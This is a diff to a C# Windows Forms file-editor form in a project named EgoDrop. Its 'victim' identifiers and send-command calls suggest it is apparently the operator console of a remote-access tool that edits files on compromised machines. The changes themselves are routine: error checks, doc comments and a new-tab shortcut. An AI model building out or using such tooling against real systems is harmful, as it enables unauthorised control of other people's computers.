@@ -17,7 +17,7 @@ namespace EgoDrop
     public partial class frmFileEditor : Form
     {
         public string m_szVictimID { get; init; }
-        public clsVictim m_victim { get; set; }
+        public clsVictim m_victim { get; init; }
         private Dictionary<string, Action> m_dicActEvent = new Dictionary<string, Action>();
 
         private struct stControl
@@ -60,6 +60,12 @@ namespace EgoDrop
                         int nCode = int.Parse(lsMsg[2]);
                         string szFilePath = lsMsg[3];
 
+                        if (nCode == 0)
+                        {
+                            MessageBox.Show("Write file failed.", "WriteFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+
                         TabPage page = fnFindTabWithPath(szFilePath);
                         if (page == null)
                             return;
@@ -90,6 +96,11 @@ namespace EgoDrop
             }));
         }
 
+        /// <summary>
+        /// Get controls with page.
+        /// </summary>
+        /// <param name="page"></param>
+        /// <returns></returns>
         private stControl fnGetControls(TabPage page)
         {
             if (page.Tag == null)
@@ -98,6 +109,11 @@ namespace EgoDrop
             return (stControl)page.Tag;
         }
 
+        /// <summary>
+        /// Find file page with path.
+        /// </summary>
+        /// <param name="szFilePath">File path.</param>
+        /// <returns></returns>
         private TabPage fnFindTabWithPath(string szFilePath)
         {
             foreach (TabPage page in tabControl1.TabPages)
@@ -110,6 +126,11 @@ namespace EgoDrop
             return null;
         }
 
+        /// <summary>
+        /// Add new file page.
+        /// </summary>
+        /// <param name="szFilePath">File path.</param>
+        /// <param name="szFileContent">File content.</param>
         public void fnAddNewPage(string szFilePath, string szFileContent)
         {
             TabPage page = new TabPage();
@@ -193,12 +214,18 @@ namespace EgoDrop
                 {
 
                 }
-                else if (e.KeyCode == Keys.S)
+                else if (e.KeyCode == Keys.S) //Save file.
                 {
                     var control = fnGetControls(page);
 
                     if (page.Text.Contains("*"))
                     {
+                        if (string.IsNullOrEmpty(control.szFilePath))
+                        {
+                            MessageBox.Show("File path cannot be null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+
                         m_victim.fnSendCommand(m_szVictimID, new string[]
                         {
                             "file",
@@ -322,6 +349,10 @@ namespace EgoDrop
                         controls.tbPath.Text,
                         controls.editor.Text,
                     });
+                }
+                else if (e.KeyCode == Keys.N)
+                {
+                    fnAddNewPage(string.Empty, string.Empty);
                 }
             }
             else
